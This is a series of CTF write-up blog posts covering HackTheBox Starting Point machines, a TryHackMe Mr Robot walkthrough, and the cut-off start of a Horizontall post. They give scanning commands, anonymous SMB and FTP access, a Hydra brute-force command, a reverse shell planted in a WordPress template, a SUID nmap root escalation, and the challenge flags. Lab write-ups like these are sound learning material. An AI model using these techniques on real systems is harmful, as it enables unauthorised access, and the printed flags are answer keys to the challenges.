[{"content":"Intro This is another Very Easy machine from the Starting Point section on HackTheBox. As is typical, besides just getting the root flag, we will need to answer some questions.\nTasks Task 1: What does the 3-letter acronym SMB stand for? Server Message Block Task 2: What port does SMB use to operate at? 445 Task 3: What network communication model does SMB use, architecturally speaking? Let\u0026rsquo;s Google a bit and find a diagram of the architecture used in SMB:  SMB architecture (Source: ionos.co.uk) \nThus, the answer would be:\nClient-Server Model Task 4: What is the service name for port 445 that came up in our nmap scan? For this question, let\u0026rsquo;s start an nmap scan and see what we have.\nweaponizedpeach@Akatosh:~$ nmap 10.129.1.12 Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-20 00:53 EET Nmap scan report for 10.129.1.12 Host is up (0.044s latency). Not shown: 997 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 1.86 seconds weaponizedpeach@Akatosh:~$ According to the output results, the answer should be:\nmicrosoft-ds Task 5: What is the tool we use to connect to SMB shares from our Linux distribution? While there are a few, we most commonly will use:\nsmbclient Task 6: What is the flag or switch we can use with the SMB tool to list the contents of the share? Let\u0026rsquo;s pull up the help output of smbclient to find out:\nweaponizedpeach@Akatosh:~$ smbclient -h Usage: smbclient [-?EgqBVNkPeC] [-?|--help] [--usage] [-R|--name-resolve=NAME-RESOLVE-ORDER] [-M|--message=HOST] [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-m|--max-protocol=LEVEL] [-T|--tar=\u0026lt;c|x\u0026gt;IXFvgbNan] [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES] [-t|--timeout=SECONDS] [-p|--port=PORT] [-g|--grepable] [-q|--quiet] [-B|--browse] [-d|--debuglevel=DEBUGLEVEL] [-s|--configfile=CONFIGFILE] [-l|--log-basename=LOGFILEBASE] [-V|--version] [--option=name=value] [-O|--socket-options=SOCKETOPTIONS] [-n|--netbiosname=NETBIOSNAME] [-W|--workgroup=WORKGROUP] [-i|--scope=SCOPE] [-U|--user=USERNAME] [-N|--no-pass] [-k|--kerberos] [-A|--authentication-file=FILE] [-S|--signing=on|off|required] [-P|--machine-pass] [-e|--encrypt] [-C|--use-ccache] [--pw-nt-hash] service \u0026lt;password\u0026gt; [-L|--list=HOST] seems promising. Let\u0026rsquo;s try it!\nweaponizedpeach@Akatosh:~$ smbclient -L 10.129.1.12 Enter WORKGROUP\\weaponizedpeach\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC WorkShares Disk SMB1 disabled -- no workgroup available weaponizedpeach@Akatosh:~$ Seems like a success. The switch would be:\n-L Task 7: What is the name of the share we are able to access in the end? The SMB share WorkShares does not exist by default, so it stands out. Let\u0026rsquo;s try it out first.\nweaponizedpeach@Akatosh:~$ smbclient \\\\\\\\10.129.1.12\\\\WorkShares Enter WORKGROUP\\weaponizedpeach's password: Try \u0026quot;help\u0026quot; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Mon Mar 29 11:22:01 2021 .. D 0 Mon Mar 29 11:22:01 2021 Amy.J D 0 Mon Mar 29 12:08:24 2021 James.P D 0 Thu Jun 3 11:38:03 2021 5114111 blocks of size 4096. 1753477 blocks available Nice, we have a couple of directories to choose from.\nTask 8: What is the command we can use within the SMB shell to download the files we find? For this we can pull up the SMB help menu and check what it has in store:\nTry \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; help ? allinfo altname archive backup blocksize cancel case_sensitive cd chmod chown close del deltree dir du echo exit get getfacl geteas hardlink help history iosize lcd link lock lowercase ls l mask md mget mkdir more mput newer notify open posix posix_encrypt posix_open posix_mkdir posix_rmdir posix_unlink posix_whoami print prompt put pwd q queue quit readlink rd recurse reget rename reput rm rmdir showacls setea setmode scopy stat symlink tar tarmode timeout translate unlock volume vuid wdel logon listconnect showconnect tcon tdis tid utimes logoff .. ! smb: \\\u0026gt; Let\u0026rsquo;s look which command stands out the most that we could use to download files:\nget Submit root flag Let\u0026rsquo;s continue from where we stopped at the end of Task 7 and check out the directory James. P.\nsmb: \\\u0026gt; cd James.P smb: \\James.P\\\u0026gt; ls . D 0 Thu Jun 3 11:38:03 2021 .. D 0 Thu Jun 3 11:38:03 2021 flag.txt A 32 Mon Mar 29 12:26:57 2021 5114111 blocks of size 4096. 1753477 blocks available Awesome, right there is our flag, let\u0026rsquo;s download it and finish this box :)\nsmb: \\James.P\\\u0026gt; get flag.txt getting file \\James.P\\flag.txt of size 32 as flag.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec) smb: \\James.P\\\u0026gt; exit weaponizedpeach@Akatosh:~$ cat flag.txt 5f61c10dffbc77a704d76016a22f1664 weaponizedpeach@Akatosh:~$ Per usual, we need to provide the flag in the format HTB{flag}. And so, the flag is HTB{5f61c10dffbc77a704d76016a22f1664}\nOutro Another short and simple box from the Starting Point set of machines. I like that HackTheBox mixes in Windows machines as well, not just Unix/Linux ones. And since SMB is so prevalent amongst Windows boxes, I think it is useful to touch on it as well.\n","date":"2022-02-20T00:11:44+02:00","image":"https://weaponizedpeach.github.io/p/hackthebox-dancing/cover_huc350168a85a8c545d04a462f80e8f57b_247533_120x120_fill_box_smart1_3.png","permalink":"https://weaponizedpeach.github.io/p/hackthebox-dancing/","title":"HackTheBox: Dancing"},{"content":"Intro This is another Very Easy machine from the Starting Point section on HackTheBox. As is typical, besides just getting the root flag, we will need to answer some questions.\nTasks Task 1: What does the 3-letter acronym FTP stand for? File Transfer Protocol Task 2: What communication model does FTP use, architecturally speaking? Here\u0026rsquo;s what the FTP architecture looks like (at a high level).\n FTP architecture (Source: educba.com) \nThus, our answer would be:\nClient-Server model Task 3: What is the name of one popular GUI FTP program? Filezilla Task 4: Which port is the FTP service active on usually? 21 TCP Task 5: What acronym is used for the secure version of FTP? Secure File Transfer Protocol\nSFTP Task 6: What is the command we can use to test our connection to the target? ping Let\u0026rsquo;s test out the connection:\nweaponizedpeach@Akatosh:~$ ping 10.129.226.127 PING 10.129.226.127 (10.129.226.127) 56(84) bytes of data. 64 bytes from 10.129.226.127: icmp_seq=1 ttl=63 time=48.9 ms 64 bytes from 10.129.226.127: icmp_seq=2 ttl=63 time=48.7 ms 64 bytes from 10.129.226.127: icmp_seq=3 ttl=63 time=48.6 ms ^C --- 10.129.226.127 ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 2004ms rtt min/avg/max/mdev = 48.627/48.742/48.871/0.100 ms weaponizedpeach@Akatosh:~$ Task 7: From your scans, what version is FTP running on the target? Let\u0026rsquo;s run an nmap scan:\nweaponizedpeach@Akatosh:~$ nmap 10.129.226.127 Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-19 22:27 EET Nmap scan report for 10.129.226.127 Host is up (0.048s latency). Not shown: 999 closed ports PORT STATE SERVICE 21/tcp open ftp Nmap done: 1 IP address (1 host up) scanned in 1.91 seconds weaponizedpeach@Akatosh:~$ Here we can see an open FTP port on 21 TCP. However, this is not enough, we also need to get the specific version of FTP used. Let\u0026rsquo;s run nmap again, this time with service and version detection (-sV) enabled.\nweaponizedpeach@Akatosh:~$ nmap -sV 10.129.226.127 Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-19 22:31 EET Nmap scan report for 10.129.226.127 Host is up (0.049s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 2.55 seconds weaponizedpeach@Akatosh:~$ This time we got some additional information. Thus, the answer is:\nvsftpd 3.0.3 Task 8: From your scans, what OS type is running on the target? We can use the nmap output from the previous task to identify the answer to this one as well.\nUnix Submit root flag Given the fact that the box is oriented towards FTP and there is only a single open port - an FTP service, let\u0026rsquo;s try to connect to it and see what happens.\nweaponizedpeach@Akatosh:~$ ftp 10.129.226.127 Connected to 10.129.226.127. 220 (vsFTPd 3.0.3) Name (10.129.226.127:weaponizedpeach): We are being asked for a username. Some FTP servers allow anonymous access, maybe this is one of them, let\u0026rsquo;s give it a try, if so, the password is likely blank:\nName (10.129.226.127:weaponizedpeach): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; We\u0026rsquo;re in. Let\u0026rsquo;s snoop around and try to snag the flag.\nftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 32 Jun 04 2021 flag.txt 226 Directory send OK. ftp\u0026gt; get flag.txt local: flag.txt remote: flag.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for flag.txt (32 bytes). 226 Transfer complete. 32 bytes received in 0.00 secs (34.7996 kB/s) ftp\u0026gt; exit 221 Goodbye. weaponizedpeach@Akatosh:~$ ls OpenVPN flag.txt weaponizedpeach@Akatosh:~$ cat flag.txt 035db21c881520061c53e0536e44f815 weaponizedpeach@Akatosh:~$ As usual, we need to provide the flag itself in the format of HTB{_flag_}:\nHTB{035db21c881520061c53e0536e44f815} And that\u0026rsquo;s it for Fawn!\n","date":"2022-02-19T22:02:29+02:00","image":"https://weaponizedpeach.github.io/p/hackthebox-fawn/cover_hu2b95b5673938ff4be2e4ed97d53fb52f_250261_120x120_fill_box_smart1_3.png","permalink":"https://weaponizedpeach.github.io/p/hackthebox-fawn/","title":"HackTheBox: Fawn"},{"content":"Intro This is a Very Easy machine from the Starting Point section on HackTheBox. It is meant to be an introductory box, to fully clear it, in addition to getting flags, we will also need to answer some questions.\nTasks Task 1: What does the acronym VM stand for? Virtual Machine Task 2: What tool do we use to interact with the operating system in order to start our VPN connection? Terminal Task 3: What service do we use to form our VPN connection? OpenVPN Task 4: What is the abreviated name for a tunnel interface in the output of your VPN boot-up sequence output? For this, we should start our VPN connection: sudo openvpn our_openvpn_file_here.ovpn.\nWe get a lot of output, but the relevant part for us is this part:\nFri Feb 18 21:38:17 2022 TUN/TAP device tun0 opened Fri Feb 18 21:38:17 2022 TUN/TAP TX queue length set to 100 Fri Feb 18 21:38:17 2022 /sbin/ip link set dev tun0 up mtu 1500 Fri Feb 18 21:38:17 2022 /sbin/ip addr add dev tun0 10.10.15.16/23 broadcast 10.10.15.255 Fri Feb 18 21:38:17 2022 /sbin/ip -6 addr add dead:beef:2::110e/64 dev tun0 Fri Feb 18 21:38:17 2022 /sbin/ip route add 10.10.10.0/23 via 10.10.14.1 Fri Feb 18 21:38:17 2022 /sbin/ip route add 10.129.0.0/16 via 10.10.14.1 Fri Feb 18 21:38:17 2022 add_route_ipv6(dead:beef::/64 -\u0026gt; dead:beef:2::1 metric -1) dev tun0 Fri Feb 18 21:38:17 2022 /sbin/ip -6 route add dead:beef::/64 dev tun0 Here we can identify the tunnel interface/device as tun0. However, we need the \u0026lsquo;abreviated name for a tunnel interface\u0026rsquo;, not our specific one.\nThus, the answer is simply:\ntun Task 5: What tool do we use to test our connection to the target? ping We might aswell just go and ping the box itself:\nweaponizedpeach@Akatosh:~$ ping 10.129.255.195 PING 10.129.255.195 (10.129.255.195) 56(84) bytes of data. 64 bytes from 10.129.255.195: icmp_seq=18 ttl=63 time=48.8 ms 64 bytes from 10.129.255.195: icmp_seq=19 ttl=63 time=48.6 ms 64 bytes from 10.129.255.195: icmp_seq=20 ttl=63 time=48.6 ms 64 bytes from 10.129.255.195: icmp_seq=21 ttl=63 time=49.1 ms 64 bytes from 10.129.255.195: icmp_seq=22 ttl=63 time=48.6 ms 64 bytes from 10.129.255.195: icmp_seq=23 ttl=63 time=48.8 ms ^C --- 10.129.255.195 ping statistics --- 23 packets transmitted, 6 received, 73.913% packet loss, time 22720ms rtt min/avg/max/mdev = 48.558/48.745/49.101/0.194 ms weaponizedpeach@Akatosh:~$ Task 6: What is the name of the tool we use to scan the target\u0026rsquo;s ports? nmap Let\u0026rsquo;s go and run a simple nmap scan:\nweaponizedpeach@Akatosh:~$ nmap 10.129.255.195 Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-18 21:47 EET Nmap scan report for 10.129.255.195 Host is up (0.048s latency). Not shown: 999 closed ports PORT STATE SERVICE 23/tcp open telnet Nmap done: 1 IP address (1 host up) scanned in 1.91 seconds weaponizedpeach@Akatosh:~$ Task 7: What service do we identify on port 23/tcp during our scans? Nmap already identified the service for us:\ntelnet Task 8: What username ultimately works with the remote management login prompt for the target? For this we will need to establish a telnet connection to the machine: telnet MACHINE_IP\nAfter a short period of time we are welcomed by a login screen:\nTrying 10.129.255.195... Connected to 10.129.255.195. Escape character is \u0026#39;^]\u0026#39;. █ █ ▐▌ ▄█▄ █ ▄▄▄▄ █▄▄█ ▀▀█ █▀▀ ▐▌▄▀ █ █▀█ █▀█ █▌▄█ ▄▀▀▄ ▀▄▀ █ █ █▄█ █▄▄ ▐█▀▄ █ █ █ █▄▄ █▌▄█ ▀▄▄▀ █▀█ Meow login: Since this is a introductory box, let\u0026rsquo;s just try root as the login.\nMeow login: root Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Fri 18 Feb 2022 08:04:01 PM UTC ... ... ... Last login: Fri Feb 18 20:01:31 UTC 2022 on pts/0 root@Meow:~# Success!\nThus, the answer to the question is:\nroot Submit root flag Since we have root access, this should be easy.\nroot@Meow:~# ls flag.txt snap root@Meow:~# cat flag.txt b40abdfe23665f766f9c61ecba8a4c19 root@Meow:~# And there\u0026rsquo;s our flag. The question wants the answer in the form HTB{_flag_}\nLet\u0026rsquo;s try: HTB{b40abdfe23665f766f9c61ecba8a4c19}\n Meow: Pwned \nOutro Although I am used to harder boxes, I was still interested what the Starting Point machines had to offer. I am glad that newcomers to HTB (and likely CTFs in general) have a place to ease into machines like this, rather than just diving into the deep end. I plan to make a write-up for each of the Starting Point machines.\n","date":"2022-02-18T20:38:56+02:00","image":"https://weaponizedpeach.github.io/p/hackthebox-meow/cover_hu2c3d08ed4ea58fcb373b6868f0121962_232234_120x120_fill_box_smart1_3.png","permalink":"https://weaponizedpeach.github.io/p/hackthebox-meow/","title":"HackTheBox: Meow"},{"content":"Intro This time we\u0026rsquo;re breaking a machine from the \u0026ldquo;Mr Robot CTF\u0026rdquo; room over on TryHackMe.\nReconnaissance The room itself on TryHackMe does not give much to go on, apart from the fact that the machine itself is inspired by the show Mr. Robot.\nScanning \u0026amp; Discovery RustScan I decided to use I\u0026rsquo;ve heard a bunch about - RustScan. It pins down open ports much more efficiently, cutting down the amount of time needed for, say, a full port scan on a box.\nFor starters, let\u0026rsquo;s go with an initial scan:\n.----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-' The Modern Day Port Scanner. ________________________________________ : https://discord.gg/GFrQsGy : : https://github.com/RustScan/RustScan : -------------------------------------- Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan [~] The config file is expected to be at \u0026quot;/home/rustscan/.rustscan.toml\u0026quot; [~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'. Open 10.10.172.225:80 Open 10.10.172.225:443 [~] Starting Script(s) [\u0026gt;] Script to be run Some(\u0026quot;nmap -vvv -p {{port}} {{ip}}\u0026quot;) [~] Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-09 21:24 UTC Initiating Ping Scan at 21:24 Scanning 10.10.172.225 [2 ports] Completed Ping Scan at 21:24, 0.05s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 21:24 Completed Parallel DNS resolution of 1 host. at 21:24, 0.00s elapsed DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating Connect Scan at 21:24 Scanning 10.10.172.225 [2 ports] Discovered open port 443/tcp on 10.10.172.225 Discovered open port 80/tcp on 10.10.172.225 Completed Connect Scan at 21:24, 0.05s elapsed (2 total ports) Nmap scan report for 10.10.172.225 Host is up, received syn-ack (0.054s latency). Scanned at 2022-02-09 21:24:42 UTC for 0s PORT STATE SERVICE REASON 80/tcp open http syn-ack 443/tcp open https syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds whatweb Whatweb did not tell me much, apart that the box is running on some version of Apache. http://10.10.111.68 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.111.68], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]\nBrowser It seems we have a web server, both HTTP and HTTPS, let\u0026rsquo;s check it out.\nWhile the website itself is very elaborate for a pentesting machine, going along with the \u0026lsquo;terminal\u0026rsquo; didn\u0026rsquo;t really lead me anywhere productive.\nThere doesn\u0026rsquo;t seem to be a difference functionality-wise whether I accessed it via HTTP or HTTPS. The self-signed SSL certificate file doesn\u0026rsquo;t leak any subdomains.\n/sitemap.xml doesn\u0026rsquo;t give anything at all.\n/robots.txt is very promising, however:  robots.txt \nSure enough, /key-1-of-3.txt leads us to the first key for this CTF: 073403c8a58a1f80d943455fb30724b9  /key-1-of-3.txt \nThe /fsocity.dic seems to be a dictionary file of sorts, line seperated, one entry per line. Might prove useful later.\nSkimming through the source code of the website clues me into that this is actually a Wordpress site, even though it doesn\u0026rsquo;t look like it. Specifically, links to wp-content and https://wordpress.org/\n WordPress source code \nferoxbuster Since we now know this is a WordPress site, we know it is a Content Management System (CMS). There should be a dashboard somewhere for content management, which coincidentally (especially on WordPress) often has opportunities for remote code execution (RCE).\nTrying to simply go to /admin puts us into a redirect loop, not leading us anywhere.\nTry to crack open the big guns and do a directory scan with feroxbuster. Similar to RustScan, this tool is also written in Rust. I like how it can scan a list of directories in parallel, making it faster. I used directory_list-2.3-big from SecLists.\n301 GET 7l 20w 234c http://10.10.172.225/blog =\u0026gt; http://10.10.172.225/blog/ 301 GET 7l 20w 236c http://10.10.172.225/images =\u0026gt; http://10.10.172.225/images/ 200 GET 0l 0w 0c http://10.10.172.225/sitemap 302 GET 0l 0w 0c http://10.10.172.225/login =\u0026gt; http://10.10.172.225/wp-login.php 301 GET 0l 0w 0c http://10.10.172.225/rss =\u0026gt; http://10.10.172.225/feed/ 301 GET 0l 0w 0c http://10.10.172.225/images/rss =\u0026gt; http://10.10.172.225/images/feed/ 301 GET 0l 0w 0c http://10.10.172.225/blog/rss =\u0026gt; http://10.10.172.225/blog/feed/ 301 GET 7l 20w 235c http://10.10.172.225/video =\u0026gt; http://10.10.172.225/video/ 301 GET 0l 0w 0c http://10.10.172.225/0 =\u0026gt; http://10.10.172.225/0/ 301 GET 0l 0w 0c http://10.10.172.225/feed =\u0026gt; http://10.10.172.225/feed/ 301 GET 0l 0w 0c http://10.10.172.225/image =\u0026gt; http://10.10.172.225/image/ 301 GET 0l 0w 0c http://10.10.172.225/atom =\u0026gt; http://10.10.172.225/feed/atom/ 301 GET 0l 0w 0c http://10.10.172.225/images/feed =\u0026gt; http://10.10.172.225/images/feed/ 301 GET 0l 0w 0c http://10.10.172.225/blog/feed =\u0026gt; http://10.10.172.225/blog/feed/ 301 GET 0l 0w 0c http://10.10.172.225/video/rss =\u0026gt; http://10.10.172.225/video/feed/ 301 GET 7l 20w 240c http://10.10.172.225/wp-content =\u0026gt; http://10.10.172.225/wp-content/ 301 GET 7l 20w 235c http://10.10.172.225/admin =\u0026gt; http://10.10.172.225/admin/ 301 GET 0l 0w 0c http://10.10.172.225/images/atom =\u0026gt; http://10.10.172.225/images/feed/atom/ 301 GET 0l 0w 0c http://10.10.172.225/blog/atom =\u0026gt; http://10.10.172.225/blog/feed/atom/ 301 GET 0l 0w 0c http://10.10.172.225/0/rss =\u0026gt; http://10.10.172.225/0/feed/ 301 GET 0l 0w 0c http://10.10.172.225/feed/rss =\u0026gt; http://10.10.172.225/feed/ 200 GET 30l 98w 1188c http://10.10.172.225/admin/index 301 GET 7l 20w 242c http://10.10.172.225/admin/images =\u0026gt; http://10.10.172.225/admin/images/ 301 GET 7l 20w 235c http://10.10.172.225/audio =\u0026gt; http://10.10.172.225/audio/ 200 GET 2028l 11941w 516314c http://10.10.172.225/intro 301 GET 7l 20w 248c http://10.10.172.225/wp-content/uploads =\u0026gt; http://10.10.172.225/wp-content/uploads/ 301 GET 7l 20w 246c http://10.10.172.225/images/headlines =\u0026gt; http://10.10.172.225/images/headlines/ We get back a lot of directories. The one that stands out to me the most is http://10.10.172.225/wp-login.php, let\u0026rsquo;s check it out.\nBrowser: /wp-login.php (1/2) Here we get a nice, typical WordPress login page. I will admit I was stuck here for a long time, not knowing how to proceed. the readme.html file doesn\u0026rsquo;t leak any info about the WordPress version.\n readme.html \nTrying to attack the form itself via sqlmap was also unsuccessful.\nWPScan _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.17 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.111.68/wp-login.php/ [10.10.111.68] [+] Started: Thu Feb 10 00:45:08 2022 Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: Apache | - X-Powered-By: PHP/5.5.29 | - X-Mod-Pagespeed: 1.9.32.3-4523 | Found By: Headers (Passive Detection) | Confidence: 100% [+] WordPress readme found: http://10.10.111.68/wp-login.php/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] This site seems to be a multisite | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | Reference: http://codex.wordpress.org/Glossary#Multisite [+] The external WP-Cron seems to be enabled: http://10.10.111.68/wp-login.php/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15). | Found By: Query Parameter In Install Page (Aggressive Detection) | - http://10.10.111.68/wp-includes/css/buttons.min.css?ver=4.3.1 | - http://10.10.111.68/wp-includes/css/dashicons.min.css?ver=4.3.1 | Confirmed By: Query Parameter In Upgrade Page (Aggressive Detection) | - http://10.10.111.68/wp-includes/css/buttons.min.css?ver=4.3.1 | - http://10.10.111.68/wp-includes/css/dashicons.min.css?ver=4.3.1 | | [!] 86 vulnerabilities identified: | ... | ... | ... [i] The main theme could not be detected. [i] No plugins Found. [i] No Config Backups Found. [+] WPScan DB API OK | Plan: free | Requests Done (during the scan): 1 | Requests Remaining: 24 [+] Finished: Thu Feb 10 00:45:15 2022 [+] Requests Done: 142 [+] Cached Requests: 184 [+] Data Sent: 38.716 KB [+] Data Received: 108.936 KB [+] Memory used: 195.27 MB [+] Elapsed time: 00:00:07 [!] 86 vulnerabilities identified\nNow that is a lot. Unfortunately, many required authentication, which we didn\u0026rsquo;t have (yet). Many were focused on XSS, which also isn\u0026rsquo;t super useful for this CTF format. The ones that focused on RCE depended on plugins that this site did not have.\nMaybe I was thinking about this too hard.\nBrowser: /wp-login.php (2/2) It\u0026rsquo;s time to come back to the fsocity.dic file, given it does look as a possible username \u0026amp; password list. However, given the 7MB size and 858160 entries in this file, trying to both find a viable username AND the password for it would have taken forever.\nI did more research about the show (Mr. Robot) the box is based on. I tried out several usernames. Fortunately, WordPress leaks viable usernames, by giving a different prompt if the username exists. Elliot is one of them.\n Possible Username \nNow that we have a possible username, let\u0026rsquo;s try to determine the password.\nHydra With username and wordlist in hand, let\u0026rsquo;s start up Hydra and try to figure out the password:\nhydra -l Elliot -P ../downloads/fsocity.dic 10.10.111.68 -V http-post-form '/wp-login.php:log=^USER^\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=http%3A%2F%2F10.10.111.68%2Fwp-admin%2F\u0026amp;testcookie=1:S=Location Eventually, we get a hit. Time to login.\n[80][http-post-form] host: 10.10.111.68 login: Elliot password: ER28-0652 Exploitation Browser: /wp-login.php (Admin dashboard) Upon logging in we are greeted with a dashboard.\n Admin Dashboard \nThe plugins section had a bunch of plugins, but none seemed to have exploitation opportunities. Fortunately, going to Appearance -\u0026gt; Editor allows us to edit various page templates. This is a great place to insert some malicious code and possibly get a reverse shell. I hopped onto RevShells and grabbed a PHP reverse shell script. I inserted it into the \u0026ldquo;404 Template\u0026rdquo;, as it seemed to easiest to exploit.\n Template Editor \nLet\u0026rsquo;s save it and try to provoke a 404 response.  404 Template with Reverse Shell saved \nI set-up my netcat listener and went to a gibberish URL hoping the 404 template would kick in and with it, the reverse shell script.\n User Access \nAnd it worked!\nPrivilege Escalation Horizontal Escalation (robot) Unfortunately, we don\u0026rsquo;t seem to have a lot of permissions to pretty much anything with this user. Let\u0026rsquo;s snoop around the /home directory.\n contents of /home/robot \nHere we found a password hash the second key, to which we don\u0026rsquo;t have access (yet). The raw-md5 clues us in that this hash is MD5. Let\u0026rsquo;s check CrackStation, maybe it has already been cracked in the past.\n Crackstation \nFortunately, CrackStation already had an exact match for this hash. We can now login to the robot user with the password abcdefghijklmnopqrstuvwxyz.\n Login with user ‘robot’ \nI had issues getting su to work, so I just spawned a shell with Python and that got it working.\nrobot access allowed me to read the key-2-of-3.txt file that I wasn\u0026rsquo;t able to previously -\u0026gt; 822c73956184f694993bede3eb39f959\nVertical escalation (root) It was now time for the final obstacle: the root user.\nSUID Binaries I scanned the system for unusual SUID binaries, this is one of the first areas I look for when trying to obtain privilege escalation, as it is one of the easiest and least time consuming to exploit. I prefer to use this one-liner:\nfind / -perm -u=s -type f 2\u0026gt;/dev/null  SUID binaries \nAmong the results was an nmap binary, in /usr/local/, of all places. I checked out GTFOBins section regarding nmap.\n GTFOBins: nmap (SUID) \nAttempting to exploit this misconfiguration proved challenging. However, upon fiddling with the binary, I noticed it was nmap v.3.81 - a very old one, dating way way back to 2005.\n GTFOBins: nmap (SUDO)  Upon closer inspection, this version seemed to be vulnerable to the SUDO exploit mentioned in scenario B of the aforementioned GTFOBins section.\nIt was time to test this out.\nrobot@linux:~$ nmap --interactive nmap --interactive Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode -- press h \u0026lt;enter\u0026gt; for help nmap\u0026gt; !sh !sh # whoami whoami root # cd /root cd /root # ls ls firstboot_done key-3-of-3.txt # cat key-3-of-3.txt cat key-3-of-3.txt 04787ddef27c3dee1ee161b21670b4e4 #  And just like that, we now both have root access and the last key: 04787ddef27c3dee1ee161b21670b4e4.\nOutro Overall, this boxed prove to be pretty balanced difficulty-wise. I mostly have one critique - the over-reliance on the massive dictionary file. The box doesn\u0026rsquo;t handle many connections well, so the password cracking took a considerable amount of time. If I had to enumerate usernames with this wordlist as well, it would have taken even longer.\nI would have also liked the front-facing side of the website to lead somewhere, rather than just working as a front/cover. I think using the robots.txt file as a callback to the show was somewhat clever.\nIt was nice to try out a couple of Rust written tools this time.\n","date":"2022-02-17T15:50:05+02:00","image":"https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/cover_hu96b9a6c6202aff74c394a8aaf471d3ad_101175_120x120_fill_box_smart1_3.png","permalink":"https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/","title":"TryHackMe: Mr Robot CTF"},{"content":"Intro Welcome to my very first writeup! I am just starting out my infosec journey, and this box was my first \u0026lsquo;real\u0026rsquo; challenge. Although it is rated \u0026lsquo;Easy\u0026rsquo;, I had to apply all of my current knowledge to snag both flags. Let\u0026rsquo;s crack straight into it!\nReconnaissance Machine tags:\n Linux CMS Exploit Outdated Software CVE Injection RCE Account Misconfiguration  The tags on the machine alone gives us a pretty good idea of what we\u0026rsquo;ll be up against.\nScanning \u0026amp; Discovery nmap Let\u0026rsquo;s start with a simple nmap scan:\n# Nmap 7.92 scan initiated Fri Feb 4 15:37:34 2022 as: nmap -sC -sV -O -oA initial_scripts_versions_os 10.10.11.105 Nmap scan report for 10.10.11.105 Host is up (0.046s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-title: Did not follow redirect to http://horizontall.htb |_http-server-header: nginx/1.14.0 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=2/4%OT=22%CT=1%CU=31967%PV=Y%DS=2%DC=I%G=Y%TM=61FD2C35 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11 OS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( 